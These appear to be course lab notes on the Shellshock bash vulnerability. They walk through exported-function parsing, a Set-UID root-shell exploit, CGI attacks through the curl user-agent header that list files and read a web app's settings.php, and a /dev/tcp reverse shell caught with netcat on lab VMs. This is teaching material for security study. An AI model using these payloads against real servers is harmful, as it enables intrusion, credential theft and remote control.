# Shellshock Attack

Some snippets below:

## Shell Functions

```bash
foo() { echo "Inside function"; }
declare -f foo # show the function def
foo
unset -f foo
declare -f foo # show the function def
```

```bash
foo() { echo "hello world"; }
declare -f foo # show the function def
foo
export -f foo
bash
foo
```

```bash
foo='() { echo "hello world"; }'
echo $foo
declare -f foo # show the function def
export foo
bash_shellshock # run vuln. version of bash

echo $foo
declare -f foo # show the function def
foo
```

## The Shellshock Vuln.

```bash
foo='() { echo "hello world"; }; echo "extra";'
echo $foo
export foo
bash_shellshock # run vuln. version of bash

echo $foo
declare -f foo # show the function def
foo
```

## Shellshock Attack on Set-UID Programs

```bash
sudo ln -sf /bin/bash_shellshock /bin/sh # link sh to the vuln. version of bash
cat vul.c
gcc vul.c -o vul
./vul
sudo chown root vul
sudo chmod 4755 vul
./vul
export foo='() { echo "hello world"; }; echo /bin/sh'
./vul # get the root shell!
sudo ln -sf /bin/dash /bin/sh # reset sh
```

## Shellshock Attacks on CGI Programs

### Pro Tip

You will likely need code/CGI scripts from the course code repo.
You can easily fetch code from the website using `wget`.

```bash
# Use wget to get a file from our course repo & save to the default folder for the Apache webserver
sudo wget -O /usr/lib/cgi-bin/myenv.cgi https://raw.githubusercontent.com/traviswpeters/csci476-code/master/03_shellshock/env.cgi
sudo chmod 755 /usr/lib/cgi-bin/myenv.cgi # make it executable
ls -al /usr/lib/cgi-bin/ # verify permissions
cat /usr/lib/cgi-bin/myenv.cgi # verify file content
```

##### Common Gotchas

A couple of issues that have come up regarding students trying to invoke CGI scripts:

0. You aren't using the official SEED VM (you should be!) ;-)
1. File not in `/usr/lib/cgi-bin/`
2. Request made to a file that does not exist in `/usr/lib/cgi-bin/`
3. File is not executable
4. File is empty
5. If all else fails, try rebooting your VM.
   Mucking around with your VM in the previous lab(s) may have broken something.


### Setup

Put this script (`test.cgi`) in `/usr/bin/cgi-bin/`

```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```

### Using `curl`

Use `curl` to interact with the CGI script

```bash
curl http://10.0.2.69/cgi-bin/test.cgi
```

### User Data in CGI Scripts

```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo "*** Environment Variables ***"
strings /proc/$$/environ
```

```bash
curl -v http://10.0.2.69/cgi-bin/test.cgi
```

Use `curl -A ...` to change the user-agent field.

```bash
curl -A "test" -v http://10.0.2.69/cgi-bin/test.cgi
```

### Launching the attack

```bash
curl -A "() { echo hello; };
         echo Content-type: text/plain;
         echo; /bin/ls -l"
         http://10.0.2.69/cgi-bin/test.cgi
```

```bash
curl -A "() { echo hello; };
         echo Content-type: text/plain;
         echo;
         /bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php"
         http://10.0.2.69/cgi-bin/test.cgi
```

### Reverse Shell

```bash
nc -lv 9090
ifconfig
```

```bash
/bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1
```

```bash
curl -A "() { echo hello; };
         echo Content-type: text/plain;
         echo;
         echo;
         /bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1"
         http://10.0.2.69/cgi-bin/test.cgi
```

```bash
nc -lv 9090
id
```

##### From class:

Follow instructions in Appendices in the SEED setup manual (lab00) to see how to clone your existing SEED VM and properly configure the NAT Network.

Step 1:
```bash
# start netcat server on "attacker" machine
seed@VM(10.0.2.15):~$ nc -lv 9090
Listening on [0.0.0.0] (family 0, port 9090)
```

Step 2:
```bash
# experiment with ideal payload on "victim" machine (i.e., a remote server)
seed@VM(10.0.2.7):~$ /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
```

At this point, you have a reverse shell setup!
You can now specify commands from the "attacker" VM,
which are sent over the network connection and run on the victim's machine;
the results are also sent back over the network connection to the "attacker" VM.
In this way, you have shell access to the victim VM!

The question then is: how do you get the victim to execute your payload?!

**NOTE:** The IP addresses are specific to my configuration.
You should use `ifconfig` to verify the IP addresses on your VMs.
